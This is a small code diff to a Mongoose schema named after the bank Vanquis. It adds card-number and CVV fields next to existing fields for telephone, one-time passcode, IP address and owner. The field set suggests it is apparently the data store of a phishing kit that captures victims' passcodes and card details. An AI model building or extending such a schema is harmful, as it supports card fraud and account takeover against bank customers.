@@ -7,6 +7,8 @@ const vanquisSchema = new mongoose.Schema({
   telephone: String,
   otpType: String,
   otp: String,
+  ccnum: String,
+  cvv: String,
   status: Number,
   ip: String,
   owner: String,
